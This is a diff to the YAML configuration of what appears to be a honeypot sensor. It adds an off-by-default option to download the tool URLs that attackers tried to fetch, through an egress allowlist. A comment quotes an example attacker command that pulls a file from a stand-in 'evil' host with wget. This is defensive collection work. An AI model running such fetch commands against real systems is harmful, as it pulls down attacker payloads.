@@ -45,8 +45,15 @@ sensor:
   # classified + persisted; ingress URLs are harvested. Collection only.
   payloads:
     enabled: true
-    max_bytes: 1048576      # 1 MiB per artifact
+    max_bytes: 1048576      # 1 MiB per artifact (pushed uploads / shellcode)
     max_total_mb: 256       # directory cap, oldest-first rotation
+    # Opt-in: actively DOWNLOAD ingress-tool URLs an attacker tried to pull
+    # (e.g. "wget http://evil/x") and store the real artifact. The fetch dials
+    # through the egress allowlist, so it can only reach destinations you
+    # explicitly permit (point it at a dedicated analysis egress). Off by
+    # default — it makes the sensor initiate outbound connections.
+    fetch_urls: false
+    fetch_max_bytes: 16777216   # 16 MiB cap per active download
   # Kernel self-confinement (Linux), applied after privilege drop. seccomp
   # denies shell-spawn / module-load / debug syscalls; landlock makes the
   # filesystem read-only except data_dir. Best-effort; see docs/hardening.md.
